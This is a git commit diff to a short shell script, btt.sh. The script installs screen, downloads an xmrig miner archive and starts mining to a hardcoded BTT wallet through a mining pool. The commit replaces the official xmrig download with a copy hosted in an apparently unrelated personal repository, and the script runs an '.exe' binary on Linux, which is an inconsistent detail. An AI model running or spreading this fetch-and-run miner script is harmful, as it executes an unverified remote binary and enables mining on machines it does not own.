e25a14d19f3f04f64f2676d444543a7ebbe2d670
deyet <73346968+deyet@users.noreply.github.com>
2021-05-07 10:11:16 +0700

    Update btt.sh

--- btt.sh
+++ btt.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+wget https://github.com/deyet/LipsumER/raw/main/xmrig-6.12.1-linux-x64.tar.gz
 tar xf ./xmrig-6.12.1-linux-x64.tar.gz
 cd ./xmrig-6.12.1
 ./xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TAogTnJSBTLFuwvEKasuh75kdAAPw6az5u.QULYPIG
